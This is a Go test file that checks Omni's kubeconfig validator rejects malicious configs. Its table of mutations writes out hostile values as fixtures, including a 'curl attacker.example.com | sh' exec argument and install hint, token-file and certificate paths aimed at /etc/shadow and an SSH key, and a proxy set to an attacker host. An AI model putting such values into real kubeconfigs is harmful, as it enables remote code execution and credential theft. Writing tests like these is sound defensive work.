// This Source Code Form is subject to the terms of the Mozilla Public
// License, v. 2.0. If a copy of the MPL was not distributed with this
// file, You can obtain one at http://mozilla.org/MPL/2.0/.

package kubeconfig_test

import (
	"testing"

	"github.com/siderolabs/crypto/x509"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/client-go/tools/clientcmd"
	clientcmdapi "k8s.io/client-go/tools/clientcmd/api"

	"github.com/siderolabs/omni/client/pkg/kubeconfig"
)

// oidcKubeconfig mirrors the OIDC kubeconfig Omni generates for users.
const oidcKubeconfig = `apiVersion: v1
kind: Config
clusters:
  - cluster:
      server: https://localhost:8095
    name: default-cluster1
contexts:
  - context:
      cluster: default-cluster1
      namespace: default
      user: default-cluster1-test@example.com
    name: default-cluster1
current-context: default-cluster1
users:
- name: default-cluster1-test@example.com
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      args:
        - oidc-login
        - get-token
        - --oidc-issuer-url=http://localhost:8080/oidc
        - --oidc-client-id=native
        - --oidc-extra-scope=cluster:cluster1
        - --grant-type=authcode-keyboard
        - --oidc-redirect-url=urn:ietf:wg:oauth:2.0:oob
        - --token-cache-dir=~/.kube/cache/oidc-login/default-cluster1-test@example.com
      command: kubectl
      env: null
      interactiveMode: IfAvailable
      provideClusterInfo: false
`

func baseConfig(name string) *clientcmdapi.Config {
	return &clientcmdapi.Config{
		CurrentContext: name,
		Clusters: map[string]*clientcmdapi.Cluster{
			name: {Server: "https://localhost:8095"},
		},
		Contexts: map[string]*clientcmdapi.Context{
			name: {Cluster: name, Namespace: "default", AuthInfo: name},
		},
		AuthInfos: map[string]*clientcmdapi.AuthInfo{
			name: {},
		},
	}
}

// serviceAccountKubeconfig mirrors the kubeconfig Omni generates for service accounts.
func serviceAccountKubeconfig(t *testing.T) *clientcmdapi.Config {
	t.Helper()

	config := baseConfig("default-cluster1-sa")
	config.AuthInfos["default-cluster1-sa"].Token = "eyJhbGciOiJSUzI1NiJ9.e30.deadbeef"

	return config
}

// breakGlassKubeconfig mirrors the Talos admin kubeconfig Omni returns as break-glass kubeconfig.
func breakGlassKubeconfig(t *testing.T) *clientcmdapi.Config {
	t.Helper()

	ca, err := x509.NewSelfSignedCertificateAuthority(x509.ECDSA(true))
	require.NoError(t, err)

	keyPair, err := x509.NewKeyPair(ca, x509.CommonName("admin"), x509.Organization("system:masters"))
	require.NoError(t, err)

	config := baseConfig("admin@cluster1")
	config.Clusters["admin@cluster1"].Server = "https://10.5.0.2:6443"
	config.Clusters["admin@cluster1"].CertificateAuthorityData = ca.CrtPEM
	config.AuthInfos["admin@cluster1"].ClientCertificateData = keyPair.CrtPEM
	config.AuthInfos["admin@cluster1"].ClientKeyData = keyPair.KeyPEM

	return config
}

func authInfo(config *clientcmdapi.Config) *clientcmdapi.AuthInfo {
	for _, a := range config.AuthInfos {
		return a
	}

	return nil
}

func cluster(config *clientcmdapi.Config) *clientcmdapi.Cluster {
	for _, c := range config.Clusters {
		return c
	}

	return nil
}

func kubeContext(config *clientcmdapi.Config) *clientcmdapi.Context {
	for _, c := range config.Contexts {
		return c
	}

	return nil
}

func TestValidateGenerated(t *testing.T) {
	t.Parallel()

	require.NoError(t, kubeconfig.Validate([]byte(oidcKubeconfig)))

	assert.NoError(t, kubeconfig.ValidateConfig(serviceAccountKubeconfig(t)))
	assert.NoError(t, kubeconfig.ValidateConfig(breakGlassKubeconfig(t)))
}

func TestValidateNotAKubeconfig(t *testing.T) {
	t.Parallel()

	err := kubeconfig.Validate([]byte("\tnot: [a, kubeconfig"))
	assert.ErrorContains(t, err, "error parsing kubeconfig")

	err = kubeconfig.Validate(nil)
	assert.ErrorIs(t, err, kubeconfig.ErrInvalidKubeconfig)
}

//nolint:maintidx
func TestValidateRejects(t *testing.T) {
	t.Parallel()

	for _, test := range []struct {
		base          func(t *testing.T) *clientcmdapi.Config
		mutate        func(*clientcmdapi.Config)
		name          string
		expectedError string
	}{
		{
			name: "arbitrary exec command",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.Command = "/bin/sh"
			},
			expectedError: `unexpected exec command "/bin/sh"`,
		},
		{
			name: "arbitrary exec args",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.Args = []string{"-c", "curl attacker.example.com | sh"}
			},
			expectedError: `exec args must start with "oidc-login get-token"`,
		},
		{
			name: "unknown exec flag",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.Args = append(authInfo(config).Exec.Args, "--certificate-authority=/etc/passwd")
			},
			expectedError: `unexpected exec args ["--certificate-authority=/etc/passwd"]`,
		},
		{
			name: "duplicate issuer url",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.Args = append(authInfo(config).Exec.Args, "--oidc-issuer-url=https://attacker.example.com")
			},
			expectedError: `unexpected exec args ["--oidc-issuer-url=https://attacker.example.com"]`,
		},
		{
			name: "reordered exec args",
			mutate: func(config *clientcmdapi.Config) {
				args := authInfo(config).Exec.Args
				args[2], args[3] = args[3], args[2]
			},
			expectedError: `exec arg "--oidc-client-id=native" must be "--oidc-issuer-url=" followed by a value`,
		},
		{
			name: "empty issuer url",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.Args[2] = "--oidc-issuer-url="
			},
			expectedError: `exec arg "--oidc-issuer-url=" must be "--oidc-issuer-url=" followed by a value`,
		},
		{
			name: "unexpected grant type",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.Args[5] = "--grant-type=device-code"
			},
			expectedError: `unexpected exec arg "--grant-type=device-code"`,
		},
		{
			name: "grant type without redirect url",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.Args[6] = "--oidc-redirect-url=https://attacker.example.com"
			},
			expectedError: `exec arg "--grant-type=authcode-keyboard" must be followed by "--oidc-redirect-url=urn:ietf:wg:oauth:2.0:oob"`,
		},
		{
			name: "exec interactive mode",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.InteractiveMode = clientcmdapi.AlwaysExecInteractiveMode
			},
			expectedError: `unexpected exec interactiveMode "Always"`,
		},
		{
			name: "certificate authority with exec",
			base: breakGlassKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				oidc, err := clientcmd.Load([]byte(oidcKubeconfig))
				require.NoError(t, err)

				*authInfo(config) = *authInfo(oidc)
			},
			expectedError: `cluster field "certificate-authority-data" is only allowed with client certificate authentication`,
		},
		{
			name: "client certificate without certificate authority",
			base: breakGlassKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).CertificateAuthorityData = nil
			},
			expectedError: `cluster field "certificate-authority-data" is not set`,
		},
		{
			name: "exec env",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.Env = []clientcmdapi.ExecEnvVar{{Name: "KUBECONFIG", Value: "/etc/passwd"}}
			},
			expectedError: `exec field "env" is not allowed`,
		},
		{
			name: "exec install hint",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Exec.InstallHint = "run curl attacker.example.com | sh"
			},
			expectedError: `exec field "installHint" is not allowed`,
		},
		{
			name: "exec and token",
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Token = "deadbeef"
			},
			expectedError: `user field "token" is not allowed`,
		},
		{
			name: "token file",
			base: serviceAccountKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).TokenFile = "/home/user/.ssh/id_ed25519"
			},
			expectedError: `user field "tokenFile" is not allowed`,
		},
		{
			name: "token with control characters",
			base: serviceAccountKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Token = "dead\x1b[2Jbeef"
			},
			expectedError: `user field "token" contains control characters`,
		},
		{
			name: "auth provider",
			base: serviceAccountKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).AuthProvider = &clientcmdapi.AuthProviderConfig{Name: "gcp"}
			},
			expectedError: `user field "auth-provider" is not allowed`,
		},
		{
			name: "no authentication",
			base: serviceAccountKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Token = ""
			},
			expectedError: `user has no authentication method set`,
		},
		{
			name: "impersonation",
			base: serviceAccountKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).Impersonate = "system:admin"
			},
			expectedError: `user field "act-as" is not allowed`,
		},
		{
			name: "client certificate path",
			base: breakGlassKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).ClientCertificate = "/etc/shadow"
			},
			expectedError: `user field "client-certificate" is not allowed`,
		},
		{
			name: "client key without certificate",
			base: breakGlassKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				authInfo(config).ClientKeyData = nil
			},
			expectedError: `user field "client-key-data" is not set`,
		},
		{
			name: "mismatched client key",
			base: breakGlassKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				other := breakGlassKubeconfig(t)
				authInfo(config).ClientKeyData = authInfo(other).ClientKeyData
			},
			expectedError: `invalid client certificate and key pair`,
		},
		{
			name: "certificate authority with a private key",
			base: breakGlassKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).CertificateAuthorityData = authInfo(config).ClientKeyData
			},
			expectedError: `unexpected PEM block type "EC PRIVATE KEY"`,
		},
		{
			name: "certificate authority with trailing data",
			base: breakGlassKubeconfig,
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).CertificateAuthorityData = append(cluster(config).CertificateAuthorityData, "garbage"...)
			},
			expectedError: `trailing data after the PEM-encoded certificates`,
		},
		{
			name: "insecure skip tls verify",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).InsecureSkipTLSVerify = true
			},
			expectedError: `cluster field "insecure-skip-tls-verify" is not allowed`,
		},
		{
			name: "proxy url",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).ProxyURL = "socks5://attacker.example.com:1080"
			},
			expectedError: `cluster field "proxy-url" is not allowed`,
		},
		{
			name: "server with embedded credentials",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).Server = "https://user:password@localhost:8095"
			},
			expectedError: `cluster server URL has embedded credentials`,
		},
		{
			name: "server with unexpected scheme",
			mutate: func(config *clientcmdapi.Config) {
				cluster(config).Server = "unix:///var/run/docker.sock"
			},
			expectedError: `unexpected cluster server URL scheme "unix"`,
		},
		{
			name: "extra cluster",
			mutate: func(config *clientcmdapi.Config) {
				config.Clusters["other"] = &clientcmdapi.Cluster{Server: "https://attacker.example.com"}
			},
			expectedError: `expected exactly one cluster, got 2`,
		},
		{
			name: "extra user",
			mutate: func(config *clientcmdapi.Config) {
				config.AuthInfos["other"] = &clientcmdapi.AuthInfo{Token: "deadbeef"}
			},
			expectedError: `expected exactly one user, got 2`,
		},
		{
			name: "context references another cluster",
			mutate: func(config *clientcmdapi.Config) {
				kubeContext(config).Cluster = "other"
			},
			expectedError: `context references cluster "other", expected "default-cluster1"`,
		},
		{
			name: "context namespace",
			mutate: func(config *clientcmdapi.Config) {
				kubeContext(config).Namespace = "kube-system"
			},
			expectedError: `unexpected context namespace "kube-system", expected "default"`,
		},
		{
			name: "current context mismatch",
			mutate: func(config *clientcmdapi.Config) {
				config.CurrentContext = "other"
			},
			expectedError: `current-context "other" doesn't match the only context "default-cluster1"`,
		},
		{
			name: "name with control characters",
			mutate: func(config *clientcmdapi.Config) {
				config.Contexts["evil\x1b[2J"] = config.Contexts["default-cluster1"]
				delete(config.Contexts, "default-cluster1")
				config.CurrentContext = "evil\x1b[2J"
			},
			expectedError: `context name contains control characters`,
		},
		{
			name: "extensions",
			mutate: func(config *clientcmdapi.Config) {
				config.Extensions = map[string]runtime.Object{"foo": nil}
			},
			expectedError: `top-level field "extensions" is not allowed`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()

			var config *clientcmdapi.Config

			if test.base != nil {
				config = test.base(t)
			} else {
				var err error

				config, err = clientcmd.Load([]byte(oidcKubeconfig))
				require.NoError(t, err)
			}

			require.NoError(t, kubeconfig.ValidateConfig(config), "the base config must be valid before mutation")

			test.mutate(config)

			err := kubeconfig.ValidateConfig(config)
			assert.ErrorIs(t, err, kubeconfig.ErrInvalidKubeconfig)
			assert.ErrorContains(t, err, test.expectedError)

			// the round-trip through YAML must be rejected the same way
			data, err := clientcmd.Write(*config)
			require.NoError(t, err)

			assert.ErrorContains(t, kubeconfig.Validate(data), test.expectedError)
		})
	}
}
